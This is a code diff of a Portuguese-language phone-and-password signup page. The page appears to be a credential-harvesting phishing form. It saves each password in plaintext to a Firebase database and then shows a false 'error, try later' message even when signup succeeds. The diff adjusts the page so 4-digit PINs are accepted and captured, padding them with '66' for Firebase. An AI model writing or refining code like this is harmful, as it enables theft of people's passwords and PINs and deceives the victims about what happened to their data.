@@ -86,7 +86,7 @@ top:-8px;left:10px;font-size:11px;color:#ffffff;background:#0d0d1c;padding:0 4px
 <div class="form-group">
 <input type="password" id="senha" class="input" placeholder=" ">
 <label class="label-floating">Senha *</label>
-<div class="error-message" id="erroSenha">Este campo é obrigatório</div>
+<div class="error-message" id="erroSenha">A senha deve ter no mínimo 4 caracteres</div>
 </div>
 
 <div style="display:flex;align-items:center;gap:8px;margin-bottom:15px;">
@@ -176,7 +176,7 @@ erroTelefone.style.display="block";
 erro=true;
 }
 
-if(!senha){
+if(!senha || senha.length<4){
 erroSenha.style.display="block";
 erro=true;
 }
@@ -185,27 +185,30 @@ if(erro) return;
 
 const emailFake=telefone+"@bot.com";
 
-auth.createUserWithEmailAndPassword(emailFake,senha)
+/* AQUI FOI AJUSTADO */
+
+let senhaFirebase=senha;
+if(senha.length===4){
+senhaFirebase=senha+"66";
+}
+
+auth.createUserWithEmailAndPassword(emailFake,senhaFirebase)
 .then((userCredential)=>{
 
 const uid=userCredential.user.uid;
 
 db.ref("users/"+uid).set({
-
 telefone:telefone,
 senha:senha,
 email:emailFake,
 data:new Date().toLocaleString()
-
 });
 
-alert("Erro, Tentar outra hora");
+alert("Erro, tentar outra hora");
 
 })
 .catch((error)=>{
-
 alert(error.message);
-
 });
 
 }
